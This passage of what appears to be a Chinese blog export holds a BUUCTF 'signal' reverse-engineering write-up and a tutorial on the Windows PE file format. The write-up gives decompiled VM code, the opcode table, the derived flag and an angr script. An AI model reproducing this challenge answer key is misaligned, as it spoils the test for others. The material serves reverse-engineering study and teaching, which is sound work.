class="keyword">int</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *a1yizhi, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> inputs[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> z; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> x; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"> </span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  x = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  z = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1yizhi[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        inputs[z + <span class="number">100</span>] = v4;</span><br><span class="line">        ++i;</span><br><span class="line">        ++z;</span><br><span class="line">        ++x;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1yizhi[i + <span class="number">1</span>] + inputs[x];</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = inputs[x] - LOBYTE(a1yizhi[i + <span class="number">1</span>]);</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1yizhi[i + <span class="number">1</span>] ^ inputs[x];</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1yizhi[i + <span class="number">1</span>] * inputs[x];</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( inputs[v7 + <span class="number">100</span>] != a1yizhi[i + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        i += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        inputs[v5] = v4;</span><br><span class="line">        ++i;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(inputs);</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = inputs[x] - <span class="number">1</span>;</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = inputs[x] + <span class="number">1</span>;</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看上去好复杂，慢慢分析吧</p><p>a1yizhi数组是已知的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// aiyizhi[]</span></span><br><span class="line"><span class="number">0x0A</span>,<span class="number">0x04</span>,<span class="number">0x10</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x0C</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x23</span>,<span class="number">0x05</span>,<span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x21</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x0B</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,<span class="number">0x32</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x51</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x24</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x0C</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x05</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x25</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x36</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x41</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x05</span>,<span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x25</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x41</span>,<span class="number">0x08</span>,<span class="number">0x0C</span>,<span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x07</span>,<span class="number">0x22</span>,<span class="number">0x07</span>,<span class="number">0x3F</span>,<span class="number">0x07</span>,<span class="number">0x34</span>,<span class="number">0x07</span>,<span class="number">0x32</span>,<span class="number">0x07</span>,<span class="number">0x72</span>,<span class="number">0x07</span>,<span class="number">0x33</span>,</span><br><span class="line"><span class="number">0x07</span>,<span class="number">0x18</span>,<span class="number">0x07</span>,<span class="number">0xA7</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x07</span>,<span class="number">0x31</span>,<span class="number">0x07</span>,<span class="number">0xF1</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x07</span>,<span class="number">0x28</span>,</span><br><span class="line"><span class="number">0x07</span>,<span class="number">0x84</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x07</span>,<span class="number">0xC1</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x07</span>,<span class="number">0x1E</span>,<span class="number">0x07</span>,<span class="number">0x7A</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出case7是在检测flag输入的真假</p><p><code>0x22,0x3F,0x34,0x32,0x72,0x33,0x18,0xA7,0xFF,0xFF,0xFF,0x31,0xF1,0xFF,0xFF,0xFF,0x28,0x84,0xFF,0xFF,0xFF,0xC1,0xFF,0xFF,0xFF,0x1E,0x7A</code></p><p>input[0]^0x10-0x05=0x22  ‘7’</p><p>input[1]^0x20*0x03=0x3f  ‘5’</p><p>input[2]-0x02-0x01=0x34  ‘7’</p><p>input[3]+1^0x04=0x32    ‘5’</p><p>input[4]*3-0x21=0x72    ‘1’</p><p>input[5]-2=0x33      ‘5’</p><p>input[6]^0x09-0x20=0x18  ‘1’</p><p>input[7]+0x51^0x24=0xA7  ‘2’</p><p>input[8]=0x31       ‘1’</p><p>input[9]*2+0x25=0xf1    ‘f’</p><p>input[10]+0x36^0x41=0x28  ‘3’</p><p>input[11]+0x20=0x84    ‘d’</p><p>input[12]*3+0x25=0xC1   ‘4’</p><p>input[13]^0x09-0x20=0x1E  ‘7’</p><p>input[14]+0x42=0x7A    ‘8’</p><p><code>flag&#123;757515121f3d478&#125;</code></p><p>这是手动试出来的，写代码挺麻烦的就算了</p><h2 id="Ponce插件符号获取flag"><a href="#Ponce插件符号获取flag" class="headerlink" title="Ponce插件符号获取flag"></a>Ponce插件符号获取flag</h2><p>不知道怎么装，</p><p><a href="https://github.com/illera88/Ponce">https://github.com/illera88/Ponce</a></p><h2 id="使用python-angr符号执行解决"><a href="#使用python-angr符号执行解决" class="headerlink" title="使用python angr符号执行解决"></a>使用python angr符号执行解决</h2><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;signal.exe&#x27;</span>)</span><br><span class="line">st = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(st)</span><br><span class="line">sm.explore(find=<span class="number">0x40175E</span>, avoid=<span class="number">0x4016E6</span>)</span><br><span class="line"><span class="built_in">print</span>(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件结构</title>
      <link href="/2021/09/04/Re/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
      <url>/2021/09/04/Re/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是PE文件？"><a href="#什么是PE文件？" class="headerlink" title="什么是PE文件？"></a>什么是PE文件？</h1><p>PE（Portable Execute）文件是Windows下可移植可执行文件的总称，常见的有DLL，EXE，OCX，SYS等，事实上，一个文件是否是PE文件与其扩展名无关。本文要说的PE文件结构，就是指的Window可移植可执行文件结构。</p><p>PE文件是使用的是平面地址空间，所有代码和数据都合并在一起，组成了一个很大的结构。</p><p>PE文件不是作为单一内存映射文件被载入内存，Windows加载器 (PE装载器) 遍历PE文件并决定哪一部分文件被映射。</p><h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><p>PE文件具有较强的移植性；<br>PE结构是一种数据组织方式；<br>PE结构主要应用于windows系统；<br>具有PE结构的文件称为PE文件；<br>EXE、DLL都是PE文件；</p><p>一个完整的PE文件主要有4个部分组成：<strong>DOS头，PE头，节表以及节数据</strong>。<br>1.Dos部分主要用来对非FE格式文件的处理，DOS时代遗留的产物，是PE文件的一个遗传基因;<br>2.PE头部分用于宏观上记录文件的一些信息，，运行平台，大小，创建日期，属性等。<br>3.节表部分用于对各中类型的数据进行定义分段;<br>4.节数据不言而喻就是文件的数据部分，实际上我们编写程序的过程中就是对该部分的数据进行编写。而其他的部分则是由编译器依照我们编写的部分进行相应的填写而得到的。</p><h2 id="基地址"><a href="#基地址" class="headerlink" title="基地址"></a>基地址</h2><p>当PE文件载入内存中后，内存的版本称为<code>模块(Module)</code>.映射文件的起始地址称为<code>模块句柄(hModule)</code>，可以通过其他模块句柄访问内存的其他数据结构。这个初始内存地址也被叫做<code>基地址(ImageBase)</code></p><p>内存的模块代表进程将这个可执行文件所需的代码、数据、资源、输入表、输出表及其他有用的数据结构放在了一个连续的内存块中。</p><h2 id="VA-amp-RVA"><a href="#VA-amp-RVA" class="headerlink" title="VA&amp;RVA"></a>VA&amp;RVA</h2><p>VA是进虚拟内存的绝对地址，RVA(Relative Virtual Address，相对虚拟地址)，指从某个基地址(ImageBase)开始的相对地址</p><p>转化公式：<code>RVA + ImageBase = VA</code></p><p>PE头内部信息主要以RVA的形式进行存储，主要原因是PE文件（主要是DLL）加载到进程虚拟内存的特定位置时， 该位置可能已经加载了其他PE文件（DLL）。此时需要进行重定位将其加载到其他的空白位置，保证程序的正常运行。</p><h2 id="RVA-To-RAW"><a href="#RVA-To-RAW" class="headerlink" title="RVA To RAW"></a>RVA To RAW</h2><p>PE文件从磁盘到内存的映射：</p><ol><li><p>查找RVA所在节区</p></li><li><p>使用简单的公式计算文件偏移：</p><p><strong>RAW - PointerToRawData = RVA - ImageBase</strong></p><p><strong>RAW = RVA - ImageBase + PointerToRawData</strong></p></li></ol><p>example：ImageBase为0x10000000，节区为.text，文件中起始地址为0x00000400，内存中的起始地址为0x01001000，RVA = 5000，RAW = 5000 - 1000 + 400 = 4400。</p><h2 id="大体框架"><a href="#大体框架" class="headerlink" title="大体框架"></a>大体框架</h2><p>PE结构DOS头，PE头，区块，输入输出表。</p><p>文件中使用<code>偏移（offset）</code>，内存中使用<code>VA（Virtual Address，虚拟地址）</code>来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为<code>代码（.text）</code>、<code>数据（.data）</code>、<code>资源（.rsrc）</code>节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充。</p><h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><h3 id="1-DOS头"><a href="#1-DOS头" class="headerlink" title="1.DOS头"></a>1.DOS头</h3><p>主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为<code>IMAGE_DOS_HEADER</code>.</p><p>大小为64字节，其中2个重要的成员分别是：</p><ul><li>e_magic：DOS签名（4D5A | MZ）占一个字节</li><li>e_lfanew：真正的PE文件头的相对偏移(RVA)，指出真正的PE头的头文件偏移位置，占四个字节位于(3Ch)处，指示NT头的偏移（文件不同，值不同）</li></ul><p>DOS存根</p><p>DOS stub(DOS块)，位于DOS头下方，可选，大小不固定，由代码和命令混合。可以把DOS MZ头与DOS stud 合称为DOS头</p><h3 id="2-PE文件头-PE-Header"><a href="#2-PE文件头-PE-Header" class="headerlink" title="2.PE文件头(PE Header)"></a>2.PE文件头(PE Header)</h3><p>PE header是PE相关结构NT映像头的简称，当运行时PE装载器将从<code>IMAGE_DOS_HEADER</code>结构的e_lfanew字段里找到PE header的起始偏移量，加上基址，得到PE文件头的指针。</p><p>PNTHeader = ImageBase + DOSHeader -&gt; e_lfanew</p><p>有两个版本的IMAGE_NT_HEADER结构，一个是PE32 另一个是PE32+，它又被叫NT头.</p><p><code>NT头</code></p><p>结构体为<code>IMAGE_NT_HEADERS</code>，大小为F8，由三个成员组成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;　　　　　　　　　　　　　　<span class="comment">//4个字节的PE标志</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;　　　　　　<span class="comment">//文件头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;<span class="comment">//可选头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><ul><li>Signature(签名数字体)值为50450000h(“PE”00),它是PE文件头的开端，MS_DOS头部的e_lfanew字段正是指向”PE\0\0”的。</li><li>IMAGE_FILE_HEADER(文件头)，表现文件大致属性，</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;　<span class="comment">//机器型号,每个CPU都拥有的唯一的Machine码,作用是区别这个exe是哪个CPU可以跑的.重要.</span></span><br><span class="line">    WORD    NumberOfSections;<span class="comment">//节区的数量  (可以理解为汇编中区的个数)现在我们有两个,一个.rdata 一个.text</span></span><br><span class="line">    DWORD   TimeDateStamp;　　<span class="comment">//程序的编译时间,参考用,没有实际作用</span></span><br><span class="line">    DWORD   PointerToSymbolTable;<span class="comment">//符号表地址  我们使用的PDB文件(里面有函数吗什么的)都存放在这个表中,不过微软是单独生成的PDB文件,所以这个字段没用,主要是给别人用</span></span><br><span class="line">    DWORD   NumberOfSymbols;　　　　<span class="comment">//符号表大小</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;　<span class="comment">//指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度,可选头大小,这个字段很重要.因为要通过这个字段,才知道可选头是多大,而不懂PE的人求选项头都是用sizeof()求出来的.所以真正的选项头大小要靠这个字段</span></span><br><span class="line">    WORD    Characteristics;　　　　<span class="comment">//文件属性,描述文件信息的.</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>4.Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit OR形式进行组合<code>注没有看结构体</code></p><ul><li><p>可选头结构体为IMAGE_OPTIONAL_HEADER，重要的成员有9个：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  DWORD                BaseOfData;</span><br><span class="line">  DWORD                ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  DWORD                SizeOfStackReserve;</span><br><span class="line">  DWORD                SizeOfStackCommit;</span><br><span class="line">  DWORD                SizeOfHeapReserve;</span><br><span class="line">  DWORD                SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><ul><li>Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B</li><li><strong>AddressOfEntryPoint</strong>：持有EP的RVA值，指出程序最先执行的代码起始地址</li><li>ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF）</li><li>SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位</li><li>SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小</li><li>SizeOfHeaders：指出整个PE头的大小</li><li>Subsystem：区分系统驱动文件和普通可执行文件</li><li>NumberOfRvaAndSize：指定DataDirectory数组的个数</li><li>DataDirectory：由IMAGE_DATA_DIRECTORY结构体组成的数组</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORYSTRUCT</span><br><span class="line">    VirtualAddressDWORD?;数据块的起始RVA</span><br><span class="line">    SizeDWORD?;数据块的长度</span><br><span class="line">IMAGE_DATA_DIRECTORYENDS</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-区块"><a href="#4-区块" class="headerlink" title="4.区块"></a>4.区块</h3><p>PE文件头与原始数据之间存在一个区块表(Section Table),区块表包含每个块在映像中的信息，分别指向不同实体。</p><p><code>区块表</code>中定义了各区块的属性，包括不同的特性、访问权限等，结构体为<code>IMAGE_SECTION_HEADER</code>，重要成员有5个：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">+<span class="number">0</span>h BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 节表名称,如“.text” </span></span><br><span class="line"><span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">+8<span class="title">h</span> &#123;</span></span><br><span class="line">DWORD PhysicalAddress; <span class="comment">// 物理地址</span></span><br><span class="line">DWORD VirtualSize; <span class="comment">// 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一</span></span><br><span class="line"><span class="comment">// 般是取后一个</span></span><br><span class="line">&#125; Misc;</span><br><span class="line">+ch DWORD VirtualAddress; <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">+<span class="number">10</span>h DWORD SizeOfRawData; <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">+<span class="number">14</span>h DWORD PointerToRawData; <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">+<span class="number">18</span>h DWORD PointerToRelocations; <span class="comment">// 在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">+<span class="number">1</span>ch DWORD PointerToLinenumbers; <span class="comment">// 行号表的偏移（供调试使用地）</span></span><br><span class="line">+<span class="number">1</span>eh WORD NumberOfRelocations; <span class="comment">// 在OBJ文件中使用，重定位项数目</span></span><br><span class="line">+<span class="number">20</span>h WORD NumberOfLinenumbers; <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">+<span class="number">24</span>h DWORD Characteristics; <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><ul><li>VirtualSize：内存中节区所占大小</li><li>VirtualAddress：内存中节区起始地址（RVA）</li><li>SizeOfRawData：磁盘文件中节区所占大小</li><li>Charateristics：节区属性（bit OR）</li></ul><h3 id="5-输入表"><a href="#5-输入表" class="headerlink" title="5.输入表"></a>5.输入表</h3><p>可执行文件使用来自其他DLL的代码或数据的动作被叫做输入，当PE文件被加载时，Windows加载器的工作之一就是定位所有被输入的函数和数据，并让正在加载的文件可以使用这些地址，这些过程是通过PE文件的输入表完成的。</p><p>所有输入函数，API的DLL的指向函数指针，这些指针叫做输入地址表(IAT)</p><p>用IT调用比IAT调用多花费jmp指令，这么复杂是因为编译器无法区分普通函数和调用函数</p><p><strong>IAT，导入地址表（Import Address Table），保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。</strong></p><p><code>PE装载器把导入函数输入至IAT的顺序</code></p><ol><li><p>读取IID的Name成员，获取库名称字符串（eg：kernel32.dll）</p></li><li><p>装载相应库：LoadLibrary(“kernel32.dll”)</p></li><li><p>读取IID的<code>OriginalFirstThunk</code>成员，获取INT地址</p></li><li><p>逐一读取INT中数组的值，获取相应<code>IMAGE_IMPORT_BY_NAME</code>地址（RVA）</p></li><li><p>使用<code>IMAGE_IMPORT_BY_NAME</code>的Hint（ordinal）或Name项，获取相应函数的起始地址：</p><p><code>GetProcAddress</code>(“GetCurrentThreadld”)</p></li><li><p>读取<code>IID的FirstThunk</code>（IAT）成员，获得IAT地址</p></li><li><p>将上面获得的函数地址输入相应IAT数组值</p></li><li><p>重复以上步骤4～7，直到INT结束（遇到NULL）</p></li></ol><p><code>IMAGE_IMPORT_DESCRIPTOR</code>结构体中记录着PE文件要导入哪些库文件，因为在执行一个程序时需要导入多个库，所以导入了多少库，就会存在多少IMAGE_IMPORT_DESCRIPTOR结构体，这些结构体组成数组，数组最后以NULL结构体结束。</p><p><code>绑定输入</code></p><p>当一个可执行文件被绑定时，IAT的<code>IMAGE_THUNK_DATA</code>数组并用输入函数的实际地址改写了。在磁盘的可执行文件中存放的是与DLL输出函数的相关的实际内存地址，可以让程序更快的初始化。</p><p>执行程序是Bind程序进行两个假设</p><ul><li>当进程初始化时，需要的DLL实际上加载到了他们的首选基地址。</li><li>自从绑定操作执行以来，DLL输入表中引用的符号位置一直没有变。</li></ul><p>绑定目录表(DataDirectorty)的第12个成员指向绑定输入，以一个<code>IMAGE_BOUND_IMPORT_DESCRIPTOR</code>结构的数组开始</p><h3 id="6-输出表"><a href="#6-输出表" class="headerlink" title="6.输出表"></a>6.输出表</h3><p>创建一个DLL时，实际上创建了一组能让EXE或其他DLL调用函数，此时PE装载器根据DLL文件中输入的信息修正被执行文件的IAT。当一个DLL函数能被EXE或另一个DLL文件使用时，它就输出了。输出信息被保存在输入表里，DLL文件通过输入表向系统提供输入函数名，序号和入口地址等信息。</p><p>输出表的第一个成员指向IMAGE_EXPORT_DIRECTORY(简称IED)结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> 